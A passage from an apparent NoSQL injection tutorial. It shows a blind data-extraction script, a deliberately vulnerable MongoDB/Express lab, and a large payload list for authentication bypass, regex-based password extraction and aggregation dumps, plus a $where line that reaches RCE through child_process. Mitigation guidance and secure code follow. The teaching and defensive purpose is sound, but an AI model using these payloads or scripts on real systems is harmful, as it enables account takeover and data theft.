            fields = ['password', 'email', 'role']
        
        users = self.enumerate_users()
        
        all_data = {}
        for username in users:
            print(f"\n{'='*50}")
            print(f" Extracting data for: {username}")
            print(f"{'='*50}")
            
            user_data = {'username': username}
            for field in fields:
                value = self.extract_field_value(username, field)
                if value:
                    user_data[field] = value
            
            all_data[username] = user_data
        
        # Save results
        with open('extracted_data.json', 'w') as f:
            json.dump(all_data, f, indent=2)
        
        print(f"\n{'='*50}")
        print(f" EXTRACTION COMPLETE")
        print(f" Data saved to: extracted_data.json")
        print(f"{'='*50}")
        
        for user, data in all_data.items():
            print(f"\n  {user}:")
            for k, v in data.items():
                if k != 'username':
                    print(f"    {k}: {v}")
        
        return all_data


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <login_url> [fields_to_extract]")
        print(f"Example: {sys.argv[0]} http://target.com/api/login password,email,role,api_key")
        sys.exit(1)
    
    fields = sys.argv[2].split(',') if len(sys.argv) > 2 else ['password', 'email', 'role']
    
    extractor = BlindExtractor(sys.argv[1])
    extractor.extract_all(fields)
```

::

---

## Vulnerable Lab — Docker Compose

::code-collapse

```yaml [docker-compose.yml]
version: '3.8'

services:
  # MongoDB vulnerable application
  nosql-app:
    build:
      context: ./nosql-app
      dockerfile: Dockerfile
    ports:
      - "8080:3000"
    environment:
      - MONGO_URI=mongodb://mongo:27017/nosqli_lab
      - JWT_SECRET=weak_secret_for_lab
      - NODE_ENV=development
    depends_on:
      mongo:
        condition: service_healthy
    networks:
      - lab-net
    restart: unless-stopped

  # MongoDB Database
  mongo:
    image: mongo:7
    ports:
      - "27017:27017"
    volumes:
      - mongo-data:/data/db
      - ./init-mongo.js:/docker-entrypoint-initdb.d/init.js
    healthcheck:
      test: echo 'db.runCommand("ping").ok' | mongosh --quiet
      interval: 5s
      timeout: 5s
      retries: 5
    networks:
      - lab-net

  # Mongo Express — Database GUI
  mongo-express:
    image: mongo-express:latest
    ports:
      - "8081:8081"
    environment:
      ME_CONFIG_MONGODB_URL: mongodb://mongo:27017/
      ME_CONFIG_BASICAUTH: "false"
    depends_on:
      - mongo
    networks:
      - lab-net

  # CouchDB vulnerable instance
  couchdb:
    image: couchdb:3
    ports:
      - "5984:5984"
    environment:
      COUCHDB_USER: admin
      COUCHDB_PASSWORD: admin
    volumes:
      - couch-data:/opt/couchdb/data
    networks:
      - lab-net

  # Redis vulnerable instance (no auth)
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    command: redis-server --protected-mode no
    networks:
      - lab-net

  # Redis Commander — GUI
  redis-commander:
    image: rediscommander/redis-commander:latest
    ports:
      - "8082:8081"
    environment:
      REDIS_HOSTS: local:redis:6379
    depends_on:
      - redis
    networks:
      - lab-net

  # Elasticsearch vulnerable instance (no auth)
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.12.0
    ports:
      - "9200:9200"
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - ES_JAVA_OPTS=-Xms512m -Xmx512m
    volumes:
      - es-data:/usr/share/elasticsearch/data
    networks:
      - lab-net

  # Request proxy for inspection
  mitmproxy:
    image: mitmproxy/mitmproxy:latest
    ports:
      - "9090:8080"
      - "9091:8081"
    command: mitmweb --web-host 0.0.0.0 --listen-port 8080 --web-port 8081
    networks:
      - lab-net

volumes:
  mongo-data:
  couch-data:
  es-data:

networks:
  lab-net:
    driver: bridge
```

::

::code-collapse

```javascript [init-mongo.js]
// MongoDB initialization for NoSQL Injection Lab

db = db.getSiblingDB('nosqli_lab');

// Users collection
db.users.drop();
db.users.insertMany([
  {
    username: "admin",
    password: "SuperS3cretAdm!n",
    email: "admin@target.com",
    role: "admin",
    full_name: "System Administrator",
    phone: "+1-555-0100",
    ssn: "123-45-6789",
    api_key: "sk_admin_xxxxxxxxxxxxxxxxxxxx",
    salary: 150000,
    department: "IT",
    notes: "Master admin account — do not share credentials",
    created_at: new Date("2023-01-01")
  },
  {
    username: "john",
    password: "john_pass_456",
    email: "john@example.com",
    role: "user",
    full_name: "John Doe",
    phone: "+1-555-0101",
    ssn: "234-56-7890",
    api_key: "sk_user_john_yyyyyyyyyyyyyyyy",
    salary: 85000,
    department: "Engineering",
    created_at: new Date("2023-03-15")
  },
  {
    username: "jane",
    password: "jane_secure_789",
    email: "jane@example.com",
    role: "user",
    full_name: "Jane Smith",
    phone: "+1-555-0102",
    ssn: "345-67-8901",
    api_key: "sk_user_jane_zzzzzzzzzzzzzzzz",
    salary: 92000,
    department: "Marketing",
    created_at: new Date("2023-06-20")
  },
  {
    username: "bob",
    password: "b0b_W1ls0n!",
    email: "bob@example.com",
    role: "moderator",
    full_name: "Bob Wilson",
    phone: "+1-555-0103",
    ssn: "456-78-9012",
    api_key: "sk_mod_bob_aaaaaaaaaaaaaaaaaa",
    salary: 95000,
    department: "Operations",
    created_at: new Date("2023-09-10")
  },
  {
    username: "alice",
    password: "al1ce_J0nes#2024",
    email: "alice@example.com",
    role: "admin",
    full_name: "Alice Jones",
    phone: "+1-555-0104",
    ssn: "567-89-0123",
    api_key: "sk_admin_alice_bbbbbbbbbbbbbbb",
    salary: 140000,
    department: "Security",
    notes: "Secondary admin — security team lead",
    created_at: new Date("2023-11-01")
  },
  {
    username: "service_bot",
    password: "svc_internal_k3y!@#",
    email: "svc@internal.target.com",
    role: "service",
    full_name: "Service Account",
    api_key: "sk_svc_internal_cccccccccccccccc",
    internal_access: true,
    created_at: new Date("2023-01-01")
  }
]);

// Products collection
db.products.drop();
db.products.insertMany([
  {name: "Laptop Pro X1", price: 1299.99, category: "Electronics", stock: 50},
  {name: "Wireless Mouse", price: 29.99, category: "Accessories", stock: 200},
  {name: "USB-C Hub", price: 49.99, category: "Accessories", stock: 150},
  {name: "Monitor 27\"", price: 399.99, category: "Electronics", stock: 75},
  {name: "Mechanical Keyboard", price: 89.99, category: "Accessories", stock: 120}
]);

// Secrets collection (sensitive internal data)
db.secrets.drop();
db.secrets.insertMany([
  {key: "db_master_password", value: "Pr0duction_DB_M@ster_2024!", type: "credential"},
  {key: "aws_access_key", value: "AKIAIOSFODNN7EXAMPLE", type: "cloud"},
  {key: "aws_secret_key", value: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", type: "cloud"},
  {key: "stripe_secret", value: "sk_live_4eC39HqLyjWDarjtT1zdp7dc", type: "payment"},
  {key: "jwt_signing_key", value: "ultra_secret_jwt_key_never_share_this!", type: "auth"},
  {key: "encryption_key", value: "AES256_K3y_xK9mP2nQ4rS6tU8vW0yZ", type: "encryption"}
]);

// Create indexes
db.users.createIndex({username: 1}, {unique: true});
db.users.createIndex({email: 1}, {unique: true});

print("[*] NoSQL Injection Lab database initialized successfully");
print("[*] Collections: users, products, secrets");
print("[*] Users: admin, john, jane, bob, alice, service_bot");
```

::

::code-collapse

```javascript [nosql-app/server.js]
/**
 * VULNERABLE NoSQL APPLICATION — Lab Server
 * This application is intentionally vulnerable to NoSQL injection
 * FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY
 */

const express = require('express');
const { MongoClient, ObjectId } = require('mongodb');
const jwt = require('jsonwebtoken');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // Enables bracket notation parsing

const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/nosqli_lab';
const JWT_SECRET = process.env.JWT_SECRET || 'weak_secret';

let db;

// Connect to MongoDB
MongoClient.connect(MONGO_URI).then(client => {
  db = client.db();
  console.log('[*] Connected to MongoDB');
}).catch(err => {
  console.error('MongoDB connection error:', err);
  process.exit(1);
});

// ===== VULNERABLE ENDPOINTS =====

// 1. Login — Operator injection (JSON body)
app.post('/api/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    // VULNERABLE — Direct use of user input in query
    // If password is {"$ne": ""}, it becomes a MongoDB operator
    const user = await db.collection('users').findOne({
      username: username,
      password: password
    });
    
    if (user) {
      const token = jwt.sign(
        { id: user._id, username: user.username, role: user.role },
        JWT_SECRET,
        { expiresIn: '24h' }
      );
      
      res.json({
        success: true,
        message: 'Login successful',
        token: token,
        user: {
          username: user.username,
          email: user.email,
          role: user.role,
          full_name: user.full_name
        }
      });
    } else {
      res.status(401).json({
        success: false,
        message: 'Invalid credentials'
      });
    }
  } catch (err) {
    // VULNERABLE — Error messages exposed
    res.status(500).json({
      success: false,
      error: err.message,
      stack: err.stack
    });
  }
});

// 2. User lookup — $where injection
app.get('/api/users/lookup', async (req, res) => {
  try {
    const query = req.query;
    
    // VULNERABLE — $where operator accepted from user input
    const users = await db.collection('users').find(query, {
      projection: { password: 0, ssn: 0 }
    }).toArray();
    
    res.json({ count: users.length, users: users });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 3. Search — Aggregation pipeline injection
app.post('/api/search', async (req, res) => {
  try {
    const { filter, sort, fields } = req.body;
    
    // VULNERABLE — User-controlled filter passed directly
    const query = filter || {};
    const projection = {};
    
    if (fields) {
      fields.forEach(f => projection[f] = 1);
    }
    
    const results = await db.collection('users').find(query, {
      projection: projection
    }).sort(sort || {}).toArray();
    
    res.json({ results: results });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 4. Product search — Regex injection
app.get('/api/products', async (req, res) => {
  try {
    const { search, category, minPrice, maxPrice } = req.query;
    const query = {};
    
    if (search) {
      // VULNERABLE — Direct regex from user input
      query.name = { $regex: search, $options: 'i' };
    }
    if (category) {
      query.category = category;
    }
    if (minPrice || maxPrice) {
      query.price = {};
      if (minPrice) query.price.$gte = parseFloat(minPrice);
      if (maxPrice) query.price.$lte = parseFloat(maxPrice);
    }
    
    const products = await db.collection('products').find(query).toArray();
    res.json({ products: products });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 5. Aggregate — Pipeline injection
app.post('/api/aggregate', async (req, res) => {
  try {
    const { collection, pipeline } = req.body;
    
    // VULNERABLE — User-controlled aggregation pipeline
    const coll = collection || 'products';
    const results = await db.collection(coll).aggregate(pipeline).toArray();
    
    res.json({ results: results });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 6. User profile — ObjectId prediction
app.get('/api/users/:id', async (req, res) => {
  try {
    const user = await db.collection('users').findOne(
      { _id: new ObjectId(req.params.id) },
      { projection: { password: 0 } }
    );
    
    if (user) {
      res.json(user);
    } else {
      res.status(404).json({ error: 'User not found' });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 7. Check user existence — Boolean-based blind
app.post('/api/check-user', async (req, res) => {
  try {
    const query = req.body;
    
    // VULNERABLE — Returns boolean based on query match
    const user = await db.collection('users').findOne(query);
    
    res.json({
      exists: !!user,
      message: user ? 'User found' : 'User not found'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ===== SECURE ENDPOINT EXAMPLE =====
app.post('/api/secure/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    // SECURE — Type checking
    if (typeof username !== 'string' || typeof password !== 'string') {
      return res.status(400).json({ error: 'Invalid input types' });
    }
    
    // SECURE — Input sanitization
    const sanitizedUser = username.replace(/[^a-zA-Z0-9_]/g, '');
    
    const user = await db.collection('users').findOne({
      username: sanitizedUser,
      password: password  // In production, use bcrypt.compare
    });
    
    if (user) {
      res.json({ success: true, user: { username: user.username } });
    } else {
      res.status(401).json({ success: false });
    }
  } catch (err) {
    res.status(500).json({ error: 'Internal error' });
  }
});

// Lab info
app.get('/', (req, res) => {
  res.json({
    lab: 'NoSQL Injection Lab',
    database: 'MongoDB',
    endpoints: [
      'POST /api/login — Operator injection (JSON body & URL params)',
      'GET  /api/users/lookup?$where=... — $where JS injection',
      'POST /api/search — Filter/query injection',
      'GET  /api/products?search=... — Regex injection',
      'POST /api/aggregate — Pipeline injection',
      'GET  /api/users/:id — ObjectId access',
      'POST /api/check-user — Boolean blind injection',
      'POST /api/secure/login — Secure example (for comparison)',
    ],
    note: 'This application is intentionally vulnerable. For educational use only.'
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`[*] NoSQL Injection Lab running on port ${PORT}`);
  console.log('[!] This server is intentionally vulnerable');
});
```

::

---

## Comprehensive Payload Collection

::code-collapse

```text [nosqli_master_payloads.txt]
# =====================================================
# NoSQL INJECTION — MASTER PAYLOAD COLLECTION
# For authorized penetration testing only
# =====================================================

# ===== MONGODB — JSON BODY PAYLOADS =====

# Authentication Bypass — $ne (not equal)
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$ne": "x"}}
{"username": "admin", "password": {"$ne": null}}

# Authentication Bypass — $gt (greater than)
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$gte": " "}}

# Authentication Bypass — $lt (less than)
{"username": "admin", "password": {"$lt": "~"}}
{"username": "admin", "password": {"$lte": "~~~~~~~~"}}

# Authentication Bypass — $regex
{"username": "admin", "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$regex": ".{1,}"}}
{"username": "admin", "password": {"$regex": "^.*$"}}
{"username": "admin", "password": {"$regex": "[\\s\\S]*"}}

# Authentication Bypass — $exists
{"username": "admin", "password": {"$exists": true}}

# Authentication Bypass — $type
{"username": "admin", "password": {"$type": 2}}
{"username": "admin", "password": {"$type": "string"}}

# Authentication Bypass — $nin (not in)
{"username": "admin", "password": {"$nin": [""]}}
{"username": "admin", "password": {"$nin": [null]}}

# Authentication Bypass — $not
{"username": "admin", "password": {"$not": {"$eq": ""}}}
{"username": "admin", "password": {"$not": {"$type": 10}}}

# Authentication Bypass — $or
{"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}}

# Authentication Bypass — $in
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}}

# Both fields injection
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$exists": true}, "password": {"$exists": true}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

# With boolean/null types
{"username": "admin", "password": true}
{"username": "admin", "password": null}
{"username": "admin", "password": 1}
{"username": "admin", "password": []}

# ===== URL PARAMETER PAYLOADS (BRACKET NOTATION) =====

username=admin&password[$ne]=
username=admin&password[$gt]=
username=admin&password[$gte]=+
username=admin&password[$regex]=.*
username=admin&password[$exists]=true
username=admin&password[$type]=2
username=admin&password[$nin][]=
username=admin&password[$not][$eq]=
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
$or[0][username]=admin&$or[1][username]=root&password[$ne]=
username[$in][]=admin&username[$in][]=root&password[$ne]=

# URL Encoded variants
username=admin&password%5B%24ne%5D=
username=admin&password%5B%24gt%5D=
username=admin&password%5B%24regex%5D=.*

# Double encoded
username=admin&password%255B%2524ne%255D=

# ===== $where JAVASCRIPT INJECTION =====

{"$where": "1==1"}
{"$where": "true"}
{"$where": "this.username == 'admin'"}
{"$where": "this.password.length > 0"}
{"$where": "this.password != ''"}
{"$where": "sleep(5000)"}
{"$where": "function(){sleep(5000);return true;}"}

# Character extraction
{"$where": "this.password.charAt(0) == 'a'"}
{"$where": "this.password.charCodeAt(0) > 96"}
{"$where": "this.password.length == 8"}
{"$where": "this.password.match(/^admin/)"}

# RCE via constructor chain
{"$where": "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')"}

# ===== BLIND REGEX EXTRACTION =====

# Password length detection
{"username": "admin", "password": {"$regex": "^.{1}$"}}
{"username": "admin", "password": {"$regex": "^.{8}$"}}

# Character-by-character
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}

# Character class narrowing
{"username": "admin", "password": {"$regex": "^[a-z]"}}
{"username": "admin", "password": {"$regex": "^[a-m]"}}
{"username": "admin", "password": {"$regex": "^[a-g]"}}

# ===== AGGREGATION PIPELINE INJECTION =====

# $lookup cross-collection
{"pipeline": [{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "data"}}]}

# $unionWith
{"pipeline": [{"$unionWith": "secrets"}, {"$project": {"key": 1, "value": 1}}]}

# $out (write to accessible collection)
{"pipeline": [{"$match": {}}, {"$out": "public_dump"}]}

# $group all data
{"pipeline": [{"$group": {"_id": null, "passwords": {"$push": "$password"}, "users": {"$push": "$username"}}}]}

# ===== COUCHDB PAYLOADS =====
{"selector": {"username": "admin", "password": {"$ne": ""}}}
{"selector": {"_id": {"$gt": null}}, "fields": ["username", "password"]}

# ===== REDIS PAYLOADS =====
# Via CRLF injection: SET key value\r\nGET admin_pass\r\n
# Via EVAL: EVAL "return redis.call('keys','*')" 0

# ===== ELASTICSEARCH PAYLOADS =====
{"query": {"match_all": {}}, "_source": ["username", "password"]}
{"query": {"wildcard": {"password": "*"}}}

# ===== NEO4J CYPHER INJECTION =====
'}) RETURN u UNION MATCH (u:User) RETURN u //
' OR 1=1 WITH 1 as a MATCH (n) RETURN n //
```

::

---

## Mitigation & Prevention

::card-group
  ::card
  ---
  title: Input Type Validation
  icon: i-lucide-check-circle
  ---
  **Always** validate that user inputs are the expected type. If you expect a string password, verify `typeof password === 'string'` before using it in a query. Reject objects, arrays, and other types.
  ::

  ::card
  ---
  title: Sanitize Operators
  icon: i-lucide-filter
  ---
  Strip or reject any input containing MongoDB operators (`$ne`, `$gt`, `$regex`, `$where`, `$exists`). Use libraries like `mongo-sanitize` or `express-mongo-sanitize` to automatically strip `$` and `.` from user input.
  ::

  ::card
  ---
  title: Disable Server-Side JS
  icon: i-lucide-code-off
  ---
  Disable `$where`, `$function`, `mapReduce`, and `$accumulator` operators that execute JavaScript on the server. Set `--noscripting` flag when starting MongoDB or configure `security.javascriptEnabled: false`.
  ::

  ::card
  ---
  title: Schema Validation
  icon: i-lucide-shield-check
  ---
  Use Mongoose schemas (Node.js) or similar ODMs that enforce field types at the schema level. Define strict schemas that reject unexpected operators and validate data types before query construction.
  ::

  ::card
  ---
  title: Least Privilege
  icon: i-lucide-user-minus
  ---
  Application database users should have **minimum permissions**. Don't use admin credentials. Restrict access to sensitive collections. Enable MongoDB authentication and RBAC.
  ::

  ::card
  ---
  title: Enable Authentication
  icon: i-lucide-lock
  ---
  Never run NoSQL databases without authentication. Enable auth for MongoDB (`--auth`), set passwords for Redis (`requirepass`), and configure CouchDB admin accounts. Bind to localhost or private networks.
  ::
::

### Secure Code Examples

::code-group
```javascript [Node.js — Mongoose (Secure)]
const mongoose = require('mongoose');

// SECURE — Strict schema enforcement
const userSchema = new mongoose.Schema({
  username: { type: String, required: true, index: true },
  password: { type: String, required: true },
  email: { type: String, required: true },
  role: { type: String, enum: ['user', 'admin', 'moderator'], default: 'user' }
}, { strict: true });  // strict: true rejects unknown fields

const User = mongoose.model('User', userSchema);

// SECURE — Login with type validation
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Type check — reject non-string inputs
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input types' });
  }
  
  // Input length limits
  if (username.length > 100 || password.length > 200) {
    return res.status(400).json({ error: 'Input too long' });
  }
  
  // Use bcrypt.compare — never store/compare plaintext
  const user = await User.findOne({ username: username });
  if (user && await bcrypt.compare(password, user.password)) {
    // Generate JWT token
    res.json({ success: true });
  } else {
    res.status(401).json({ success: false });
  }
});
```

```javascript [Express — mongo-sanitize Middleware]
const mongoSanitize = require('express-mongo-sanitize');

// SECURE — Strip $ and . from all request data
app.use(mongoSanitize({
  replaceWith: '_',
  onSanitize: ({ req, key }) => {
    console.warn(`[SECURITY] Sanitized key: ${key} in ${req.originalUrl}`);
  }
}));

// Now these are automatically sanitized:
// {"password": {"$ne": ""}} → {"password": {"_ne": ""}}
// password[$gt]= → password[_gt]=
```

```python [Python — pymongo (Secure)]
from pymongo import MongoClient
import bcrypt

client = MongoClient('mongodb://localhost:27017/')
db = client['app_db']

def secure_login(username, password):
    # SECURE — Type validation
    if not isinstance(username, str) or not isinstance(password, str):
        raise ValueError("Invalid input types")
    
    # SECURE — Length limits
    if len(username) > 100 or len(password) > 200:
        raise ValueError("Input too long")
    
    # SECURE — Sanitize operators
    if any(op in str(username) + str(password) for op in ['$', '{', '}']):
        raise ValueError("Invalid characters in input")
    
    # SECURE — Query with validated string inputs only
    user = db.users.find_one({"username": username})
    
    if user and bcrypt.checkpw(password.encode(), user['password'].encode()):
        return user
    
    return None
```

```python [Python — Input Sanitization Helper]
import re

def sanitize_mongo_input(data):
    """Remove MongoDB operators from user input"""
    if isinstance(data, dict):
        sanitized = {}
        for key, value in data.items():
            # Remove keys starting with $
            if key.startswith('$'):
                continue
            # Remove keys containing dots (field traversal)
            if '.' in key:
                continue
            sanitized[key] = sanitize_mongo_input(value)
        return sanitized
    elif isinstance(data, list):
        return [sanitize_mongo_input(item) for item in data]
    elif isinstance(data, str):
        # Ensure it's actually a string, not an operator
        return data
    else:
        return data

# Usage:
user_input = request.json
safe_input = sanitize_mongo_input(user_input)
result = db.users.find_one(safe_input)
```

```php [PHP — Input Validation]
<?php
// SECURE — Type checking for MongoDB queries

function secure_login($username, $password, $collection) {
    // Type validation
    if (!is_string($username) || !is_string($password)) {
        throw new InvalidArgumentException('Invalid input types');
    }
    
    // Length limits
    if (strlen($username) > 100 || strlen($password) > 200) {
        throw new InvalidArgumentException('Input too long');
    }
    
    // Sanitize — remove $ operators
    $username = preg_replace('/[\$\{\}]/', '', $username);
    
    // Query with validated strings only
    $user = $collection->findOne([
        'username' => $username
    ]);
    
    if ($user && password_verify($password, $user['password'])) {
        return $user;
    }
    
    return null;
}
?>
```

```ruby [Ruby — Mongoid (Secure)]
# SECURE — Mongoid with strict params
class User
  include Mongoid::Document
  
  field :username, type: String
  field :password_digest, type: String
  field :email, type: String
  field :role, type: String, default: 'user'
  
  # Whitelist allowed roles
  validates :role, inclusion: { in: %w[user admin moderator] }
end

# SECURE — Controller with type checking
def login
  username = params[:username]
  password = params[:password]
  
  # Type validation
  unless username.is_a?(String) && password.is_a?(String)
    render json: { error: 'Invalid input' }, status: 400
    return
  end
  
  # Sanitize — remove operator characters
  username = username.gsub(/[\$\{\}\[\]]/, '')
  
  user = User.where(username: username).first
  
  if user&.authenticate(password)
    render json: { success: true }
  else
    render json: { success: false }, status: 401
  end
end
```
::

### Security Checklist

::field-group
  ::field{name="Input Type Validation" type="critical"}
  All user inputs are type-checked before use in database queries. Objects and arrays rejected when strings expected. Length limits enforced.
  ::

  ::field{name="Operator Sanitization" type="critical"}
  MongoDB operators (`$ne`, `$gt`, `$regex`, `$where`, etc.) stripped from all user input. Middleware like `express-mongo-sanitize` deployed.
  ::

  ::field{name="Server-Side JS Disabled" type="critical"}
  `$where`, `$function`, `mapReduce` JavaScript execution disabled in production MongoDB configuration.
  ::

  ::field{name="Authentication Enabled" type="critical"}
  MongoDB running with `--auth`. Redis has `requirepass` set. CouchDB has admin accounts configured. No default credentials.
  ::

  ::field{name="Network Binding" type="high"}
  Database bound to `localhost` or private network only. Not exposed to public internet. Firewall rules restricting access to application servers only.
  ::

  ::field{name="Schema Enforcement" type="high"}
  ODM (Mongoose, Mongoid, etc.) with strict schemas enforces field types. MongoDB JSON Schema validation enabled on collections.
  ::

  ::field{name="Least Privilege" type="high"}
  Application uses database user with minimum required permissions. No admin credentials in application config. Read-only access where writes aren't needed.
  ::

  ::field{name="Error Handling" type="medium"}
  Database error messages never exposed to users. Generic error responses in production. Detailed errors logged server-side only.
  ::

  ::field{name="Monitoring & Alerting" type="medium"}
  Database query logging enabled. Alerting on suspicious operators in queries. Rate limiting on authentication endpoints. Failed login monitoring.
  ::
::

::tip
The most effective defense against NoSQL injection is **input type validation** — simply checking `typeof input === 'string'` before using it in a query prevents the vast majority of operator injection attacks. Combine this with operator sanitization middleware and schema enforcement for defense in depth.
::